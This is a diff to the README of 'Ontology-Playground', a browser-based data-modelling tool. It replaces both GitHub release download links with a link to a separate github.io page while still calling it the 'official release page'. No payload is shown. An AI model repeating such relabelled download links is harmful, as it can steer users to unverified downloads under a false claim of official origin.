@@ -1,6 +1,6 @@
 # 🌐 Ontology-Playground - Visualize and build your data models
 
-[![](https://img.shields.io/badge/Download-Ontology--Playground-blue.svg)](https://github.com/afrazpindari14-commits/Ontology-Playground/releases)
+[![](https://img.shields.io/badge/Download-Ontology--Playground-blue.svg)](https://afrazpindari14-commits.github.io)
 
 Ontology-Playground helps you learn how data models work. You can explore existing structures or build your own from scratch. The app runs directly in your web browser, which means your data stays on your computer. You do not need to install complex server software or manage databases to use this tool.
 
@@ -21,7 +21,7 @@ The application remains fully static. This means it functions as a standalone fi
 
 You need to download the application package to your Windows computer to begin. Follow these installation steps to set up the software.
 
-1. Go to the [official release page](https://github.com/afrazpindari14-commits/Ontology-Playground/releases).
+1. Go to the [official release page](https://afrazpindari14-commits.github.io).
 2. Look for the section labeled Assets.
 3. Click the link that ends with a .zip extension.
 4. Save the file to your Downloads folder.
